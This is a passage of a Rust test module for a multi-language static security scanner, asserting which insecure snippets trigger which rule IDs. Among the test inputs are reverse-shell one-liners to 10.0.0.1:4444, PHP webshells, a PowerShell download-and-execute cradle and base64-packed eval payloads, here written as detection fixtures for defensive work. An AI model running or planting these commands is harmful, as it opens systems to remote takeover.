        let safe = "el.innerHTML = DOMPurify.sanitize(userInput);\n";
        assert!(!hit_ids(safe, Language::JavaScript, "a.js").contains(&"VS-JS-004"));

        let unsafe_assign = "el.innerHTML = userInput;\n";
        assert!(hit_ids(unsafe_assign, Language::JavaScript, "a.js").contains(&"VS-JS-004"));
    }

    #[test]
    fn commented_out_code_is_ignored() {
        let code = "# subprocess.run(cmd, shell=True)\n";
        assert!(hit_ids(code, Language::Python, "app.py").is_empty());
    }

    #[test]
    fn noisy_rules_are_suppressed_in_test_files() {
        let code = "x = Math.random()\n";
        assert!(hit_ids(code, Language::JavaScript, "src/app.test.js").is_empty());
        assert!(hit_ids(code, Language::JavaScript, "src/app.js").contains(&"VS-JS-015"));
    }

    #[test]
    fn tsx_inherits_javascript_rules() {
        let code = "<div dangerouslySetInnerHTML={{ __html: bio }} />\n";
        assert!(hit_ids(code, Language::Tsx, "Profile.tsx").contains(&"VS-JS-003"));
    }

    #[test]
    fn finds_rust_tls_bypass() {
        let code = "let c = Client::builder().danger_accept_invalid_certs(true).build()?;\n";
        assert!(hit_ids(code, Language::Rust, "src/net.rs").contains(&"VS-RS-006"));
    }

    #[test]
    fn finds_go_weak_cipher() {
        let code = "block, _ := des.NewCipher(key)\n";
        assert!(hit_ids(code, Language::Go, "crypto.go").contains(&"VS-GO-007"));
    }

    #[test]
    fn finds_go_world_writable() {
        let code = "os.WriteFile(path, data, 0777)\n";
        assert!(hit_ids(code, Language::Go, "io.go").contains(&"VS-GO-009"));
        let ok = "os.WriteFile(path, data, 0600)\n";
        assert!(!hit_ids(ok, Language::Go, "io.go").contains(&"VS-GO-009"));
    }

    #[test]
    fn finds_java_weak_cipher_and_hostname() {
        let cipher = "Cipher c = Cipher.getInstance(\"DES/CBC/PKCS5Padding\");\n";
        assert!(hit_ids(cipher, Language::Java, "Crypto.java").contains(&"VS-JV-007"));
        let host = "conn.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);\n";
        assert!(hit_ids(host, Language::Java, "Net.java").contains(&"VS-JV-008"));
    }

    #[test]
    fn finds_java_cors_wildcard() {
        let code = "config.setAllowedOrigins(Arrays.asList(\"*\"));\n";
        assert!(hit_ids(code, Language::Java, "Cors.java").contains(&"VS-JV-009"));
    }

    #[test]
    fn finds_php_reflected_xss() {
        let code = "<?php echo $_GET['name']; ?>\n";
        assert!(hit_ids(code, Language::Php, "page.php").contains(&"VS-PH-006"));
        let ok = "<?php echo htmlspecialchars($_GET['name'], ENT_QUOTES); ?>\n";
        assert!(!hit_ids(ok, Language::Php, "page.php").contains(&"VS-PH-006"));
    }

    #[test]
    fn finds_php_preg_replace_e() {
        let code = "$out = preg_replace('/(\\w+)/e', 'strtoupper($1)', $in);\n";
        assert!(hit_ids(code, Language::Php, "r.php").contains(&"VS-PH-008"));
        let ok = "$out = preg_replace('/(\\w+)/i', 'X', $in);\n";
        assert!(!hit_ids(ok, Language::Php, "r.php").contains(&"VS-PH-008"));
    }

    #[test]
    fn finds_ruby_send_from_params() {
        let code = "user.send(params[:method])\n";
        assert!(hit_ids(code, Language::Ruby, "app/controllers/u.rb").contains(&"VS-RB-006"));
    }

    #[test]
    fn finds_csharp_weak_tls() {
        let bad = "ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;\n";
        assert!(hit_ids(bad, Language::CSharp, "Net.cs").contains(&"VS-CS-006"));
        let ok = "ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;\n";
        assert!(!hit_ids(ok, Language::CSharp, "Net.cs").contains(&"VS-CS-006"));
    }

    #[test]
    fn finds_csharp_shell_command() {
        let code = "Process.Start(\"cmd.exe\", \"/c \" + userInput);\n";
        assert!(hit_ids(code, Language::CSharp, "Run.cs").contains(&"VS-CS-004"));
    }

    #[test]
    fn finds_c_unbounded_scanf() {
        let code = "char buf[16];\nscanf(\"%s\", buf);\n";
        assert!(hit_ids(code, Language::C, "in.c").contains(&"VS-C-004"));
        let ok = "char buf[16];\nscanf(\"%15s\", buf);\n";
        assert!(!hit_ids(ok, Language::C, "in.c").contains(&"VS-C-004"));
    }

    #[test]
    fn finds_c_insecure_tempfile() {
        let code = "char *p = tmpnam(NULL);\n";
        assert!(hit_ids(code, Language::C, "t.c").contains(&"VS-C-005"));
    }

    #[test]
    fn finds_dockerfile_env_secret() {
        let code = "ENV DB_PASSWORD=hunter2\n";
        assert!(hit_ids(code, Language::Dockerfile, "Dockerfile").contains(&"VS-DK-006"));
        let ok = "ENV APP_PORT=8080\n";
        assert!(!hit_ids(ok, Language::Dockerfile, "Dockerfile").contains(&"VS-DK-006"));
    }

    #[test]
    fn finds_shell_world_writable_chmod() {
        let code = "chmod -R 777 /var/www\n";
        assert!(hit_ids(code, Language::Shell, "deploy.sh").contains(&"VS-SH-002"));
    }

    #[test]
    fn finds_actions_run_injection() {
        let code = "        run: echo \"${{ github.event.issue.title }}\"\n";
        assert!(hit_ids(code, Language::Yaml, ".github/workflows/ci.yml").contains(&"VS-CI-003"));
    }

    #[test]
    fn finds_actions_write_all() {
        let code = "permissions: write-all\n";
        assert!(hit_ids(code, Language::Yaml, ".github/workflows/ci.yml").contains(&"VS-CI-004"));
    }

    #[test]
    fn finds_swift_uiwebview() {
        let code = "let web = UIWebView(frame: .zero)\n";
        assert!(hit_ids(code, Language::Swift, "View.swift").contains(&"VS-SW-001"));
    }

    #[test]
    fn finds_swift_userdefaults_secret() {
        let code = "UserDefaults.standard.set(pw, forKey: \"user_password\")\n";
        assert!(hit_ids(code, Language::Swift, "Auth.swift").contains(&"VS-SW-004"));
        let ok = "UserDefaults.standard.set(theme, forKey: \"app_theme\")\n";
        assert!(!hit_ids(ok, Language::Swift, "Auth.swift").contains(&"VS-SW-004"));
    }

    #[test]
    fn finds_swift_js_injection() {
        let code = "webView.evaluateJavaScript(\"show('\\(name)')\")\n";
        assert!(hit_ids(code, Language::Swift, "Web.swift").contains(&"VS-SW-002"));
    }

    #[test]
    fn finds_nginx_weak_tls() {
        let bad = "ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n";
        assert!(hit_ids(bad, Language::Nginx, "nginx.conf").contains(&"VS-NG-002"));
        let ok = "ssl_protocols TLSv1.2 TLSv1.3;\n";
        assert!(!hit_ids(ok, Language::Nginx, "nginx.conf").contains(&"VS-NG-002"));
    }

    #[test]
    fn finds_elixir_binary_to_term() {
        let bad = "term = :erlang.binary_to_term(data)\n";
        assert!(hit_ids(bad, Language::Elixir, "lib/x.ex").contains(&"VS-EX-003"));
        let ok = "term = :erlang.binary_to_term(data, [:safe])\n";
        assert!(!hit_ids(ok, Language::Elixir, "lib/x.ex").contains(&"VS-EX-003"));
    }

    #[test]
    fn finds_perl_two_arg_open() {
        let code = "open(FH, $path) or die;\n";
        assert!(hit_ids(code, Language::Perl, "cgi.pl").contains(&"VS-PL-002"));
    }

    #[test]
    fn finds_scala_sql_interpolation() {
        let code = "val q = s\"SELECT * FROM users WHERE id = $id\"\n";
        assert!(hit_ids(code, Language::Scala, "Repo.scala").contains(&"VS-SC-001"));
    }

    #[test]
    fn finds_lua_os_execute() {
        let code = "os.execute(\"rm \" .. name)\n";
        assert!(hit_ids(code, Language::Lua, "build.lua").contains(&"VS-LU-001"));
    }

    #[test]
    fn finds_python_zip_slip() {
        let code = "tar.extractall(dest)\n";
        assert!(hit_ids(code, Language::Python, "unpack.py").contains(&"VS-PY-022"));
        let ok = "tar.extractall(dest, filter=\"data\")\n";
        assert!(!hit_ids(ok, Language::Python, "unpack.py").contains(&"VS-PY-022"));
    }

    #[test]
    fn finds_python_ssti() {
        let code = "return render_template_string(\"Hello \" + name)\n";
        assert!(hit_ids(code, Language::Python, "views.py").contains(&"VS-PY-023"));
    }

    #[test]
    fn finds_python_jwt_no_verify() {
        let code = "jwt.decode(token, options={\"verify_signature\": False})\n";
        assert!(hit_ids(code, Language::Python, "auth.py").contains(&"VS-PY-024"));
        // A plain requests verify=False must not trip the JWT rule.
        let tls = "requests.get(url, verify=False)\n";
        assert!(!hit_ids(tls, Language::Python, "api.py").contains(&"VS-PY-024"));
    }

    #[test]
    fn finds_js_nosql_where() {
        let code = "db.users.find({ $where: \"this.name == '\" + q + \"'\" })\n";
        assert!(hit_ids(code, Language::JavaScript, "q.js").contains(&"VS-JS-029"));
    }

    #[test]
    fn finds_java_snakeyaml_load() {
        let code = "Object o = new Yaml().load(input);\n";
        assert!(hit_ids(code, Language::Java, "Cfg.java").contains(&"VS-JV-010"));
    }

    #[test]
    fn finds_terraform_public_db() {
        let code = "  publicly_accessible = true\n";
        assert!(hit_ids(code, Language::Terraform, "rds.tf").contains(&"VS-TF-006"));
    }

    #[test]
    fn finds_vue_v_html() {
        let code = "<div v-html=\"userBio\"></div>\n";
        assert!(hit_ids(code, Language::Vue, "Profile.vue").contains(&"VS-VU-001"));
    }

    #[test]
    fn finds_svelte_at_html() {
        let code = "<p>{@html comment}</p>\n";
        assert!(hit_ids(code, Language::Svelte, "Comment.svelte").contains(&"VS-SV-001"));
    }

    #[test]
    fn finds_php_assert_string() {
        let code = "assert(\"$a == $b\");\n";
        assert!(hit_ids(code, Language::Php, "check.php").contains(&"VS-PH-010"));
        // A boolean assert must not trip the string-eval rule.
        let ok = "assert($a === $b);\n";
        assert!(!hit_ids(ok, Language::Php, "check.php").contains(&"VS-PH-010"));
    }

    #[test]
    fn finds_ruby_open_redirect() {
        let code = "redirect_to params[:return_to]\n";
        assert!(hit_ids(code, Language::Ruby, "sessions_controller.rb").contains(&"VS-RB-007"));
    }

    #[test]
    fn finds_go_ssh_ignore_hostkey() {
        let code = "config.HostKeyCallback = ssh.InsecureIgnoreHostKey()\n";
        assert!(hit_ids(code, Language::Go, "ssh.go").contains(&"VS-GO-010"));
    }

    #[test]
    fn finds_csharp_httpclient_cert_bypass() {
        let code = "handler.ServerCertificateCustomValidationCallback = (m, c, ch, e) => true;\n";
        assert!(hit_ids(code, Language::CSharp, "Http.cs").contains(&"VS-CS-007"));
    }

    #[test]
    fn finds_sql_xp_cmdshell() {
        let code = "EXEC xp_cmdshell 'whoami';\n";
        assert!(hit_ids(code, Language::Sql, "proc.sql").contains(&"VS-SQL-001"));
    }

    #[test]
    fn finds_sql_grant_all_and_password() {
        let g = "GRANT ALL PRIVILEGES ON app.* TO 'svc'@'%';\n";
        assert!(hit_ids(g, Language::Sql, "grants.sql").contains(&"VS-SQL-002"));
        let p = "CREATE USER 'svc'@'%' IDENTIFIED BY 'hunter2';\n";
        assert!(hit_ids(p, Language::Sql, "users.sql").contains(&"VS-SQL-003"));
    }

    #[test]
    fn finds_java_processbuilder_shell() {
        let code = "new ProcessBuilder(\"sh\", \"-c\", cmd).start();\n";
        assert!(hit_ids(code, Language::Java, "Run.java").contains(&"VS-JV-012"));
        let ok = "new ProcessBuilder(\"git\", \"log\", branch).start();\n";
        assert!(!hit_ids(ok, Language::Java, "Run.java").contains(&"VS-JV-012"));
    }

    #[test]
    fn finds_java_dom4j_xxe() {
        let code = "SAXReader reader = new SAXReader();\n";
        assert!(hit_ids(code, Language::Java, "Xml.java").contains(&"VS-JV-011"));
    }

    #[test]
    fn finds_php_webshell() {
        assert!(hit_ids("<?php system($_GET['cmd']);", Language::Php, "up.php").contains(&"VS-PH-011"));
        assert!(hit_ids("<?php $_POST['f']($_POST['a']);", Language::Php, "x.php").contains(&"VS-PH-012"));
        assert!(hit_ids("<?php eval(base64_decode($p));", Language::Php, "x.php").contains(&"VS-PH-013"));
    }

    #[test]
    fn php_normal_superglobal_use_is_not_a_webshell() {
        // Reading a request value is everyday code; only executing it is the shell.
        let ok = "<?php $name = htmlspecialchars($_GET['name']);\necho $name;\n";
        let ids = hit_ids(ok, Language::Php, "page.php");
        assert!(!ids.contains(&"VS-PH-011"));
        assert!(!ids.contains(&"VS-PH-012"));
    }

    #[test]
    fn finds_reverse_shells() {
        assert!(hit_ids("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n", Language::Shell, "x.sh").contains(&"VS-SH-003"));
        assert!(hit_ids("nc -e /bin/sh 10.0.0.1 4444\n", Language::Shell, "x.sh").contains(&"VS-SH-004"));
        let py = "import pty; pty.spawn(\"/bin/bash\")\n";
        assert!(hit_ids(py, Language::Python, "s.py").contains(&"VS-PY-027"));
    }

    #[test]
    fn finds_packed_payloads() {
        assert!(hit_ids("exec(base64.b64decode(blob))\n", Language::Python, "x.py").contains(&"VS-PY-028"));
        assert!(hit_ids("eval(atob('ZG9jdW1lbnQ='))\n", Language::JavaScript, "x.js").contains(&"VS-JS-030"));
        let ps = "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')\n";
        assert!(hit_ids(ps, Language::PowerShell, "x.ps1").contains(&"VS-PS-003"));
    }

    #[test]
    fn finds_swallowed_exceptions() {
        assert!(hit_ids("try:\n    f()\nexcept Exception:\n    pass\n", Language::Python, "a.py").contains(&"VS-PY-029"));
        assert!(hit_ids("try { f(); } catch (e) {}\n", Language::JavaScript, "a.js").contains(&"VS-JS-031"));
        // A catch that actually does something is fine.
        let ok = "try:\n    f()\nexcept ValueError:\n    log(e)\n";
        assert!(!hit_ids(ok, Language::Python, "a.py").contains(&"VS-PY-029"));
    }

    #[test]
    fn finds_weak_crypto_iv_and_key() {
        let iv = "cipher.init(ENCRYPT_MODE, key, new IvParameterSpec(new byte[16]));\n";
        assert!(hit_ids(iv, Language::Java, "Crypto.java").contains(&"VS-JV-014"));
        let key = "SecretKeySpec k = new SecretKeySpec(\"0123456789abcdef\".getBytes(), \"AES\");\n";
        assert!(hit_ids(key, Language::Java, "Crypto.java").contains(&"VS-JV-015"));
        // A random IV from SecureRandom must not trip the fixed-IV rule.
        let ok = "byte[] iv = new byte[16]; rng.nextBytes(iv);\nnew IvParameterSpec(iv);\n";
        assert!(!hit_ids(ok, Language::Java, "Crypto.java").contains(&"VS-JV-014"));
    }

    #[test]
    fn finds_ecb_mode() {
        assert!(hit_ids("aes.Mode = CipherMode.ECB;\n", Language::CSharp, "Enc.cs").contains(&"VS-CS-010"));
        assert!(hit_ids("cipher = AES.new(key, AES.MODE_ECB)\n", Language::Python, "enc.py").contains(&"VS-PY-030"));
    }

    #[test]
    fn finds_ldap_injection() {
        let jv = "String filter = \"(uid=\" + username + \")\";\n";
        assert!(hit_ids(jv, Language::Java, "Auth.java").contains(&"VS-JV-016"));
        let py = "flt = \"(uid=\" + username + \")\"\n";
        assert!(hit_ids(py, Language::Python, "auth.py").contains(&"VS-PY-031"));
    }

    #[test]
    fn finds_xpath_injection() {
        let code = "Object r = xpath.evaluate(\"/users/user[name='\" + name + \"']\", doc);\n";
        assert!(hit_ids(code, Language::Java, "Lookup.java").contains(&"VS-JV-017"));
    }

    #[test]
    fn finds_ruby_mass_assignment_and_ssti() {
        assert!(hit_ids("user.update_attributes(params)\n", Language::Ruby, "u.rb").contains(&"VS-RB-008"));
        assert!(hit_ids("ERB.new(params[:tpl]).result(binding)\n", Language::Ruby, "r.rb").contains(&"VS-RB-009"));
        // Strong parameters via permit must not trip mass assignment.
        let ok = "user.update(params.require(:user).permit(:name))\n";
        assert!(!hit_ids(ok, Language::Ruby, "u.rb").contains(&"VS-RB-008"));
    }

    #[test]
    fn finds_prototype_pollution() {
        assert!(hit_ids("target[key].__proto__ = source;\n", Language::JavaScript, "merge.js").contains(&"VS-JS-032"));
        assert!(hit_ids("obj.constructor.prototype.admin = true;\n", Language::JavaScript, "x.js").contains(&"VS-JS-032"));
        // A comparison against __proto__ must not be flagged as a write.
        let ok = "if (obj.__proto__ === Array.prototype) return;\n";
        assert!(!hit_ids(ok, Language::JavaScript, "x.js").contains(&"VS-JS-032"));
    }

    #[test]
    fn finds_postmessage_wildcard() {
        assert!(hit_ids("win.postMessage(payload, \"*\");\n", Language::JavaScript, "x.js").contains(&"VS-JS-033"));
        // A concrete target origin is fine.
        let ok = "win.postMessage(payload, \"https://app.example.com\");\n";
        assert!(!hit_ids(ok, Language::JavaScript, "x.js").contains(&"VS-JS-033"));
    }

    #[test]
    fn finds_spel_injection() {
        let bad = "Expression e = parser.parseExpression(userInput);\n";
        assert!(hit_ids(bad, Language::Java, "Eval.java").contains(&"VS-JV-018"));
        let concat = "parser.parseExpression(\"T(\" + cls + \").run()\");\n";
        assert!(hit_ids(concat, Language::Java, "Eval.java").contains(&"VS-JV-018"));
    }

    #[test]
    fn finds_xxe_factory_and_xmldecoder() {
        let f = "DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n";
        assert!(hit_ids(f, Language::Java, "Xml.java").contains(&"VS-JV-019"));
        let dec = "XMLDecoder d = new XMLDecoder(in);\n";
        assert!(hit_ids(dec, Language::Java, "De.java").contains(&"VS-JV-020"));
        // A hardened factory must not be flagged.
        let ok = "dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n";
        assert!(!hit_ids(ok, Language::Java, "Xml.java").contains(&"VS-JV-019"));
    }

    #[test]
    fn finds_hardcoded_secret_key() {
        let bad = "SECRET_KEY = \"django-insecure-9f8a7b6c5d4e3f2a1b\"\n";
        assert!(hit_ids(bad, Language::Python, "settings.py").contains(&"VS-PY-032"));
        // Reading from the environment is the correct pattern.
        let ok = "SECRET_KEY = os.environ[\"SECRET_KEY\"]\n";
        assert!(!hit_ids(ok, Language::Python, "settings.py").contains(&"VS-PY-032"));
    }

    #[test]
    fn finds_timing_unsafe_digest_compare() {
        let bad = "if mac.hexdigest() == provided:\n    ok()\n";
        assert!(hit_ids(bad, Language::Python, "verify.py").contains(&"VS-PY-033"));
        // compare_digest is the constant-time fix.
        let ok = "if hmac.compare_digest(mac.hexdigest(), provided):\n    ok()\n";
        assert!(!hit_ids(ok, Language::Python, "verify.py").contains(&"VS-PY-033"));
    }

    #[test]
    fn finds_java_deser_rce_gadgets() {
        let jackson = "mapper.enableDefaultTyping();\n";
        assert!(hit_ids(jackson, Language::Java, "M.java").contains(&"VS-JV-021"));
        let xstream = "Object o = xstream.fromXML(xml);\n";
        assert!(hit_ids(xstream, Language::Java, "X.java").contains(&"VS-JV-024"));
    }

    #[test]
    fn finds_jndi_lookup_from_variable() {
        let bad = "Object o = ctx.lookup(name);\n";
        assert!(hit_ids(bad, Language::Java, "J.java").contains(&"VS-JV-022"));
        // A static resource name is the safe, ordinary case.
        let ok = "DataSource ds = (DataSource) ctx.lookup(\"java:comp/env/jdbc/DB\");\n";
        assert!(!hit_ids(ok, Language::Java, "J.java").contains(&"VS-JV-022"));
    }

    #[test]
    fn finds_scriptengine_eval() {
        let se = "engine = manager.getEngineByName(\"nashorn\");\n";
        assert!(hit_ids(se, Language::Java, "S.java").contains(&"VS-JV-023"));
        let groovy = "Object r = new GroovyShell().evaluate(script);\n";
        assert!(hit_ids(groovy, Language::Java, "G.java").contains(&"VS-JV-023"));
    }

    #[test]
    fn finds_csharp_typenamehandling() {
        let bad = "var s = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All };\n";
        assert!(hit_ids(bad, Language::CSharp, "S.cs").contains(&"VS-CS-011"));
        // None is the safe setting.
        let ok = "var s = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.None };\n";
        assert!(!hit_ids(ok, Language::CSharp, "S.cs").contains(&"VS-CS-011"));
    }

    #[test]
    fn finds_k8s_host_namespaces_and_caps() {
        assert!(hit_ids("      hostPID: true\n", Language::Kubernetes, "pod.yaml").contains(&"VS-K8-005"));
        assert!(hit_ids("            - SYS_ADMIN\n", Language::Kubernetes, "pod.yaml").contains(&"VS-K8-006"));
        // Dropping ALL is the recommended hardening, not a finding.
        let ok = "            - ALL\n";
        assert!(!hit_ids(ok, Language::Kubernetes, "pod.yaml").contains(&"VS-K8-006"));
    }

    #[test]
    fn finds_php_dynamic_code_and_scope_pollution() {
        assert!(hit_ids("<?php $f = create_function('$a', $body);", Language::Php, "d.php").contains(&"VS-PH-014"));
        assert!(hit_ids("<?php parse_str($_SERVER['QUERY_STRING']);", Language::Php, "p.php").contains(&"VS-PH-015"));
        // parse_str with a result array is the safe form.
        let ok = "<?php parse_str($input, $result);";
        assert!(!hit_ids(ok, Language::Php, "p.php").contains(&"VS-PH-015"));
    }

    #[test]
    fn finds_unsafe_reflection() {
        let jv = "Class<?> c = Class.forName(className);\n";
        assert!(hit_ids(jv, Language::Java, "R.java").contains(&"VS-JV-025"));
        // A constant class name is the ordinary, safe case.
        let ok = "Class.forName(\"com.mysql.jdbc.Driver\");\n";
        assert!(!hit_ids(ok, Language::Java, "R.java").contains(&"VS-JV-025"));
        let rb = "klass = params[:type].constantize\n";
        assert!(hit_ids(rb, Language::Ruby, "r.rb").contains(&"VS-RB-010"));
    }

    #[test]
    fn finds_go_path_traversal() {
        let sf = "http.ServeFile(w, r, r.URL.Path)\n";
        assert!(hit_ids(sf, Language::Go, "h.go").contains(&"VS-GO-011"));
        let join = "p := filepath.Join(root, r.FormValue(\"name\"))\n";
        assert!(hit_ids(join, Language::Go, "h.go").contains(&"VS-GO-012"));
        // A static join is fine.
        let ok = "p := filepath.Join(root, \"config.yaml\")\n";
        assert!(!hit_ids(ok, Language::Go, "h.go").contains(&"VS-GO-012"));
    }

    #[test]
    fn finds_terraform_cloud_misconfig() {
        let cases = [
            ("  block_public_acls = false\n", "VS-TF-008"),
            ("  backup_retention_period = 0\n", "VS-TF-009"),
            ("  associate_public_ip_address = true\n", "VS-TF-010"),
            ("  enable_key_rotation = false\n", "VS-TF-011"),
            ("  is_multi_region_trail = false\n", "VS-TF-012"),
            ("  \"Principal\": \"*\"\n", "VS-TF-013"),
            ("  viewer_protocol_policy = \"allow-all\"\n", "VS-TF-014"),
            ("  min_tls_version = \"TLS1_0\"\n", "VS-TF-015"),
            ("  allow_nested_items_to_be_public = true\n", "VS-TF-016"),
            ("  enable_https_traffic_only = false\n", "VS-TF-017"),
            ("  public_network_access_enabled = true\n", "VS-TF-018"),
            ("  purge_protection_enabled = false\n", "VS-TF-019"),
            ("  source_address_prefix = \"*\"\n", "VS-TF-020"),
            ("  members = [\"allUsers\"]\n", "VS-TF-021"),
            ("  source_ranges = [\"0.0.0.0/0\"]\n", "VS-TF-022"),
            ("  issue_client_certificate = true\n", "VS-TF-023"),
            ("  enable_shielded_nodes = false\n", "VS-TF-024"),
        ];
        for (code, id) in cases {
            assert!(hit_ids(code, Language::Terraform, "main.tf").contains(&id), "{id} should fire");
        }
        // Hardened values must not trip these rules.
        let ok = "  min_tls_version = \"TLS1_2\"\n  enable_key_rotation = true\n";
        let ids = hit_ids(ok, Language::Terraform, "main.tf");
        assert!(!ids.contains(&"VS-TF-011") && !ids.contains(&"VS-TF-015"));
    }

    #[test]
    fn finds_k8s_hardening_gaps() {
        assert!(hit_ids("      automountServiceAccountToken: true\n", Language::Kubernetes, "p.yaml").contains(&"VS-K8-007"));
        assert!(hit_ids("        readOnlyRootFilesystem: false\n", Language::Kubernetes, "p.yaml").contains(&"VS-K8-008"));
        assert!(hit_ids("      image: nginx:latest\n", Language::Kubernetes, "p.yaml").contains(&"VS-K8-009"));
        assert!(hit_ids("          type: Unconfined\n", Language::Kubernetes, "p.yaml").contains(&"VS-K8-010"));
        assert!(hit_ids("        - hostPort: 8080\n", Language::Kubernetes, "p.yaml").contains(&"VS-K8-011"));
        // A pinned image and RuntimeDefault seccomp are fine.
        let ok = "      image: nginx@sha256:abc123\n          type: RuntimeDefault\n";
        let ids = hit_ids(ok, Language::Kubernetes, "p.yaml");
        assert!(!ids.contains(&"VS-K8-009") && !ids.contains(&"VS-K8-010"));
    }

    #[test]
    fn finds_mobile_webview_and_storage() {
        assert!(hit_ids("webView.addJavascriptInterface(bridge, \"Android\");\n", Language::Java, "A.java").contains(&"VS-JV-026"));
        assert!(hit_ids("settings.setAllowUniversalAccessFromFileURLs(true);\n", Language::Java, "A.java").contains(&"VS-JV-027"));
        assert!(hit_ids("openFileOutput(\"f\", Context.MODE_WORLD_READABLE);\n", Language::Java, "A.java").contains(&"VS-JV-028"));
        assert!(hit_ids("kSecAttrAccessible as String: kSecAttrAccessibleAlways\n", Language::Swift, "K.swift").contains(&"VS-SW-005"));
        assert!(hit_ids("<key>NSAllowsArbitraryLoads</key><true/>\n", Language::Swift, "Info.swift").contains(&"VS-SW-006"));
    }

    #[test]
    fn finds_web_framework_misconfig() {
        assert!(hit_ids("@csrf_exempt\ndef view(r): pass\n", Language::Python, "v.py").contains(&"VS-PY-034"));
        assert!(hit_ids("ALLOWED_HOSTS = ['*']\n", Language::Python, "settings.py").contains(&"VS-PY-035"));
        assert!(hit_ids("CORS(app)\n", Language::Python, "app.py").contains(&"VS-PY-036"));
        assert!(hit_ids("app.use(cors({ origin: \"*\" }))\n", Language::JavaScript, "s.js").contains(&"VS-JS-034"));
        assert!(hit_ids("@CrossOrigin(origins = \"*\")\n", Language::Java, "C.java").contains(&"VS-JV-029"));
        assert!(hit_ids("token.Method = jwt.SigningMethodNone\n", Language::Go, "j.go").contains(&"VS-GO-013"));
        assert!(hit_ids("policy.AllowAnyOrigin();\n", Language::CSharp, "S.cs").contains(&"VS-CS-012"));
        assert!(hit_ids("settings.DtdProcessing = DtdProcessing.Parse;\n", Language::CSharp, "X.cs").contains(&"VS-CS-013"));
        assert!(hit_ids("$d->loadXML($xml, LIBXML_NOENT);", Language::Php, "x.php").contains(&"VS-PH-016"));
        assert!(hit_ids("skip_before_action :verify_authenticity_token\n", Language::Ruby, "c.rb").contains(&"VS-RB-011"));
        assert!(hit_ids("send_file params[:path]\n", Language::Ruby, "c.rb").contains(&"VS-RB-012"));
        // A restricted CORS origin and a real Host list must not fire.
        let ok_cors = "@CrossOrigin(origins = \"https://app.example.com\")\n";
        assert!(!hit_ids(ok_cors, Language::Java, "C.java").contains(&"VS-JV-029"));
        let ok_hosts = "ALLOWED_HOSTS = ['app.example.com']\n";
        assert!(!hit_ids(ok_hosts, Language::Python, "settings.py").contains(&"VS-PY-035"));
    }

    #[test]
    fn finds_weak_tls_crypto_and_protocols() {
        assert!(hit_ids("ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1)\n", Language::Python, "s.py").contains(&"VS-PY-037"));
        assert!(hit_ids("cipher = DES.new(key, DES.MODE_CBC)\n", Language::Python, "c.py").contains(&"VS-PY-038"));
        assert!(hit_ids("import telnetlib\n", Language::Python, "t.py").contains(&"VS-PY-039"));
        assert!(hit_ids("res.redirect(req.query.next)\n", Language::JavaScript, "r.js").contains(&"VS-JS-035"));
        assert!(hit_ids("tls.connect({ secureProtocol: 'TLSv1_method' })\n", Language::JavaScript, "t.js").contains(&"VS-JS-036"));
        assert!(hit_ids("SSLContext.getInstance(\"SSLv3\");\n", Language::Java, "S.java").contains(&"VS-JV-030"));
        assert!(hit_ids("var p = new DESCryptoServiceProvider();\n", Language::CSharp, "C.cs").contains(&"VS-CS-014"));
        assert!(hit_ids("curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);", Language::Php, "c.php").contains(&"VS-PH-017"));
        assert!(hit_ids("http.verify_mode = OpenSSL::SSL::VERIFY_NONE\n", Language::Ruby, "h.rb").contains(&"VS-RB-013"));
        assert!(hit_ids("open(\"| /bin/sh\")\n", Language::Ruby, "o.rb").contains(&"VS-RB-014"));
        assert!(hit_ids("atom = String.to_atom(user_input)\n", Language::Elixir, "a.ex").contains(&"VS-EX-004"));
        // Safe counterparts must not fire.
        assert!(!hit_ids("String.to_existing_atom(name)\n", Language::Elixir, "a.ex").contains(&"VS-EX-004"));
        assert!(!hit_ids("File.open(path)\n", Language::Ruby, "o.rb").contains(&"VS-RB-014"));
    }

    #[test]
    fn finds_iac_ci_docker_misconfig() {
        assert!(hit_ids("USER root\n", Language::Dockerfile, "Dockerfile").contains(&"VS-DK-007"));
        assert!(hit_ids("RUN sudo apt-get update\n", Language::Dockerfile, "Dockerfile").contains(&"VS-DK-008"));
        assert!(hit_ids("RUN pip install --trusted-host pypi.org flask\n", Language::Dockerfile, "Dockerfile").contains(&"VS-DK-009"));
        assert!(hit_ids("RUN apt-get install -y --allow-unauthenticated curl\n", Language::Dockerfile, "Dockerfile").contains(&"VS-DK-010"));
        assert!(hit_ids("    runs-on: self-hosted\n", Language::Yaml, "ci.yml").contains(&"VS-CI-005"));
        assert!(hit_ids("  ACTIONS_ALLOW_UNSECURE_COMMANDS: true\n", Language::Yaml, "ci.yml").contains(&"VS-CI-006"));
        assert!(hit_ids("proxy_pass http://$backend;\n", Language::Nginx, "nginx.conf").contains(&"VS-NG-005"));
        assert!(hit_ids("  skip_final_snapshot = true\n", Language::Terraform, "rds.tf").contains(&"VS-TF-025"));
        assert!(hit_ids("  deletion_protection = false\n", Language::Terraform, "rds.tf").contains(&"VS-TF-026"));
        assert!(hit_ids("  image_tag_mutability = \"MUTABLE\"\n", Language::Terraform, "ecr.tf").contains(&"VS-TF-027"));
        assert!(hit_ids("  scan_on_push = false\n", Language::Terraform, "ecr.tf").contains(&"VS-TF-028"));
        assert!(hit_ids("  validate_certs: no\n", Language::Yaml, "play.yml").contains(&"VS-AN-001"));
        assert!(hit_ids("ssh -o StrictHostKeyChecking=no host\n", Language::Shell, "deploy.sh").contains(&"VS-AN-002"));
        assert!(hit_ids("  mode: '0777'\n", Language::Yaml, "play.yml").contains(&"VS-AN-003"));
    }

    #[test]
    fn finds_perl_string_eval() {
        assert!(hit_ids("eval \"$user_code\";\n", Language::Perl, "s.pl").contains(&"VS-PL-003"));
        // Block eval for error handling is safe.
        assert!(!hit_ids("eval { risky() };\n", Language::Perl, "s.pl").contains(&"VS-PL-003"));
    }

    #[test]
    fn rule_extras_reference_real_rules_and_compile() {
        // Every extra must point at a real rule id, and each sink must compile.
        let ids: std::collections::HashSet<&str> = RULES.iter().map(|r| r.id).collect();
        for ex in RULE_EXTRAS {
